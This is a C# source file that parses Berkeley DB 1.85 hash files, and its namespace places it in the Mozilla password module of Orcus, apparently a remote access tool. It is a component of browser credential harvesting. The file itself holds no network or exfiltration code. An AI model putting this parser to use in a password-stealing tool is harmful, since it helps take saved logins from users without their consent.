using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Orcus.Commands.Passwords.Applications.Mozilla
{
    public class BerkeleyDb
    {
        public BerkeleyDb(string fileName)
        {
            List<byte> entire = new List<byte>();
            Keys = new List<KeyValuePair<string, string>>();

            using (var fs = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            using (BinaryReader dbReader = new BinaryReader(fs))
            {
                int pos = 0;
                int length = (int) dbReader.BaseStream.Length;

                while (pos < length)
                {
                    entire.Add(dbReader.ReadByte());
                    pos += sizeof (byte);
                }
            }
            string magic = BitConverter.ToString(Extract(entire.ToArray(), 0, 4, false)).Replace("-", "");
            string version = BitConverter.ToString(Extract(entire.ToArray(), 4, 4, false)).Replace("-", "");
            int pageSize = BitConverter.ToInt32(Extract(entire.ToArray(), 12, 4, true), 0);

            if (magic.Equals("00061561"))
            {
                Version = "Berkelet DB";

                if (version.Equals("00000002"))
                {
                    Version += " 1.85 (Hash, version 2, native byte-order)";
                }

                int nbKey =
                    Int32.Parse(BitConverter.ToString(Extract(entire.ToArray(), 0x38, 4, false)).Replace("-", ""));
                int page = 1;

                while (Keys.Count < nbKey)
                {
                    string[] address = new string[(nbKey - Keys.Count)*2];

                    for (int i = 0; i < (nbKey - Keys.Count)*2; i++)
                    {
                        address[i] =
                            BitConverter.ToString(Extract(entire.ToArray(), pageSize*page + 2 + i*2, 2, true))
                                .Replace("-", "");
                    }

                    Array.Sort(address);

                    for (int i = 0; i < address.Length; i = i + 2)
                    {
                        int startValue = Convert.ToInt32(address[i], 16) + pageSize*page;
                        int startKey = Convert.ToInt32(address[i + 1], 16) + pageSize*page;
                        int end = i + 2 >= address.Length
                            ? pageSize + pageSize*page
                            : Convert.ToInt32(address[i + 2], 16) + pageSize*page;

                        string key = Encoding.ASCII.GetString(Extract(entire.ToArray(), startKey, end - startKey, false));
                        string value =
                            BitConverter.ToString(Extract(entire.ToArray(), startValue, startKey - startValue, false));

                        if (!string.IsNullOrEmpty(key))
                        {
                            Keys.Add(new KeyValuePair<string, string>(key, value));
                        }
                    }
                    page++;
                }
            }
            else
            {
                Version = "Unknow database format";
            }
        }

        public string Version { get; set; }
        public List<KeyValuePair<string, string>> Keys { get; }

        private byte[] Extract(Byte[] source, int start, int length, bool littleEndian)
        {
            byte[] dest = new byte[length];
            int j = 0;

            for (int i = start; i < start + length; i++)
            {
                dest[j] = source[i];
                j++;
            }

            if (littleEndian)
            {
                Array.Reverse(dest);
            }
            return dest;
        }
    }
}